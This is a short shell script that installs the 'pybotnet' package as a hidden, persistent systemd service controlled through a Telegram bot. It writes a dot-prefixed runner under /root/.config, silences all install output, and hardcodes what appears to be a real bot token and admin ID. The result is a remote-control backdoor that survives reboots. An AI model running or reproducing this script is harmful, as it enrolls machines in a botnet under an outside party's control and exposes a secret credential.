#!/bin/sh

telegram_bot_token=6660924010:AAH1gGxy4g9K93brhy2sXyj--GTRfGdyhXs
admin_id=1927705157
bot_name=dagingmerah_bot

service_name=pybotnet
runner="/root/.config/.$service_name.sh"

# Create runner 
tee<<EOF > $runner
#!/bin/sh
apt-get update > /dev/null 2>&1 &&
apt-get install python3-pip -y -qq > /dev/null 2>&1 &&
apt-get install python3-dev -y -qq > /dev/null 2>&1 &&
pip3 install "pybotnet>=2<3" -U -qqq &&
python3 -m pybotnet -t $telegram_bot_token -i $admin_id -n $bot_name
EOF

chmod +x $runner

tee<<EOF > /etc/systemd/system/$service_name.service
[Unit]
Description=$service_name
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh $runner
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

chmod 644 /etc/systemd/system/$service_name.service
systemctl daemon-reload
systemctl enable $service_name.service
systemctl restart $service_name.service
